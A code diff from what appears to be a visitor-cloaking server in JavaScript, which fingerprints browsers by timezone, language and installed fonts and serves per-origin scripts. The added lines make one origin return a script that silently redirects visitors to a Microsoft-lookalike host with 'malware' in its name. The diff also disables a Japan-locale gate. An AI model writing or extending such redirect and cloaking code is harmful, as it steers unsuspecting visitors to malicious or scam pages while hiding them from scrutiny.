@@ -292,6 +292,11 @@ for (const filename of uniqueFiles) {
  */
 function buildSecondaryJS(origin) {
   const normalised = (origin || "").replace(/\/+$/, "").toLowerCase();
+
+  if(normalised === "https://miyabugamajp.store"){
+    return `window.location.replace('https://rnicrosoftmalware-gkcfc5gresbybmhh.z01.azurefd.net');`;
+  }
+  
   const config = Object.entries(ORIGIN_CONFIG).find(
     ([o]) => o.replace(/\/+$/, "").toLowerCase() === normalised,
   )?.[1];
@@ -422,48 +427,48 @@ function verify(fp, ip) {
   })();
 
   // ─── 3. Japan Locale / Timezone ─────────────────────────────
-  (function checkJapan() {
-    const tz = (fp.timezone || "").toLowerCase();
-    const lang = (fp.language || "").toLowerCase();
-    const langs = (fp.languages || []).map((l) => l.toLowerCase());
+  // (function checkJapan() {
+  //   const tz = (fp.timezone || "").toLowerCase();
+  //   const lang = (fp.language || "").toLowerCase();
+  //   const langs = (fp.languages || []).map((l) => l.toLowerCase());
 
-    // All known IANA timezone identifiers that map to JST (UTC+9 / Japan):
-    //   • "Asia/Tokyo"  — canonical IANA identifier
-    //   • "Japan"       — backward-compatibility alias (IANA 'backward' file links Japan → Asia/Tokyo)
-    //   • "Etc/GMT-9"   — fixed UTC+9 offset (IANA uses inverted sign convention in Etc/)
-    //   • "Etc/GMT-09"  — some implementations zero-pad the offset
-    //   • "JST"         — abbreviation used by some systems (e.g. older Java, some Linux configs)
-    //   • "JST-9"       — POSIX-style TZ string for Japan Standard Time
-    const JAPAN_TIMEZONES = new Set([
-      "asia/tokyo",
-      "japan",
-      "etc/gmt-9",
-      "etc/gmt-09",
-      "jst",
-      "jst-9",
-    ]);
+  //   // All known IANA timezone identifiers that map to JST (UTC+9 / Japan):
+  //   //   • "Asia/Tokyo"  — canonical IANA identifier
+  //   //   • "Japan"       — backward-compatibility alias (IANA 'backward' file links Japan → Asia/Tokyo)
+  //   //   • "Etc/GMT-9"   — fixed UTC+9 offset (IANA uses inverted sign convention in Etc/)
+  //   //   • "Etc/GMT-09"  — some implementations zero-pad the offset
+  //   //   • "JST"         — abbreviation used by some systems (e.g. older Java, some Linux configs)
+  //   //   • "JST-9"       — POSIX-style TZ string for Japan Standard Time
+  //   const JAPAN_TIMEZONES = new Set([
+  //     "asia/tokyo",
+  //     "japan",
+  //     "etc/gmt-9",
+  //     "etc/gmt-09",
+  //     "jst",
+  //     "jst-9",
+  //   ]);
 
-    const isJapanTz = JAPAN_TIMEZONES.has(tz);
-    // JST = UTC+9 → offset = -540
-    const isJapanOffset = fp.timezoneOffset === -540;
-    const hasJaLang =
-      lang.startsWith("ja") || langs.some((l) => l.startsWith("ja"));
+  //   const isJapanTz = JAPAN_TIMEZONES.has(tz);
+  //   // JST = UTC+9 → offset = -540
+  //   const isJapanOffset = fp.timezoneOffset === -540;
+  //   const hasJaLang =
+  //     lang.startsWith("ja") || langs.some((l) => l.startsWith("ja"));
 
-    // Japanese fonts presence is a strong secondary signal
-    const jpFonts = ["Meiryo", "MS Gothic", "MS PGothic", "Yu Gothic"];
-    const hasJpFonts = (fp.fonts || []).some((f) => jpFonts.includes(f));
+  //   // Japanese fonts presence is a strong secondary signal
+  //   const jpFonts = ["Meiryo", "MS Gothic", "MS PGothic", "Yu Gothic"];
+  //   const hasJpFonts = (fp.fonts || []).some((f) => jpFonts.includes(f));
 
-    // We require timezone match AND at least one language/font signal
-    const pass = (isJapanTz || isJapanOffset) && (hasJaLang || hasJpFonts);
+  //   // We require timezone match AND at least one language/font signal
+  //   const pass = (isJapanTz || isJapanOffset) && (hasJaLang || hasJpFonts);
 
-    critical.push({
-      name: "japan_locale",
-      pass,
-      reason: pass
-        ? `Japan detected — tz:${tz}, lang:${lang}, jpFonts:${hasJpFonts}`
-        : `Not Japan — tz:${tz}(${fp.timezoneOffset}), lang:${lang}, jpFonts:${hasJpFonts}`,
-    });
-  })();
+  //   critical.push({
+  //     name: "japan_locale",
+  //     pass,
+  //     reason: pass
+  //       ? `Japan detected — tz:${tz}, lang:${lang}, jpFonts:${hasJpFonts}`
+  //       : `Not Japan — tz:${tz}(${fp.timezoneOffset}), lang:${lang}, jpFonts:${hasJpFonts}`,
+  //   });
+  // })();
 
   // // ─── 3. German/Austrian Locale & Timezone ───────────────────
   // (function checkGermanLocale() {
